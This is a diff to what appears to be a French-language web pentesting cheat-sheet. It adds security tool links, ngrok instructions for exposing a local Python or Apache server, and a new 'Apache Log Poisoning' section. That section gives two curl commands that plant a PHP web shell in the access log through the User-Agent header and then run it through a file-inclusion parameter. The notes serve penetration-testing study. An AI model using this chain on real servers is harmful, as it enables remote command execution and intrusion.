@@ -20,6 +20,7 @@
 - [Nuclei](https://red-security.fr/t/tutoriel-nuclei/92)
 - [RSS Validator](https://validator.w3.org/feed/)
 - [Tplmap](https://github.com/epinna/tplmap)
+- [Grunt-Retire.js](https://github.com/RetireJS/grunt-retire)
 
 - [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)
 
@@ -32,6 +33,8 @@
 
 ### Serveur web - Ngrok
 
+#### SimpleHTTPServer
+
 ```
 ngrok tcp 8000 #éviter http
 python -m http.server 8000 #dossier adéquat
@@ -40,6 +43,20 @@ python -m http.server 8000 #dossier adéquat
 Accéder 
 
 `http://X.tcp.eu.ngrok.io:port`
+
+#### LAMP
+
+```
+# /etc/httpd/conf/httpd.conf
+#...
+#Listen 8000
+ngrok tcp 8000
+sudo systemctl restart httpd
+```
+
+- https://wiki.archlinux.org/title/Apache_HTTP_Server
+- https://wiki.archlinux.org/title/MariaDB
+- https://www.noip.com/ #freedns
 
 ### Simple WebSite (React app + backend + db)
 
@@ -57,6 +74,7 @@ Accéder
 - [DotGit](https://github.com/davtur19/DotGit) **avec** https://github.com/arthaud/git-dumper
 - [Shodan](https://addons.mozilla.org/en-US/firefox/addon/shodan-addon/)
 - [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
+- [Retire.js](https://retirejs.github.io/retire.js/)
 
 ### Chrome (only)
 
@@ -118,6 +136,15 @@ include("pages/$file");
 et `.htaccess`
 
 `allow_url_include = Off` pour PHP<7.4.0
+
+#### Apache Log Poisoning
+
+- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache
+
+```bash
+curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+```
 
 ### SQLi
 
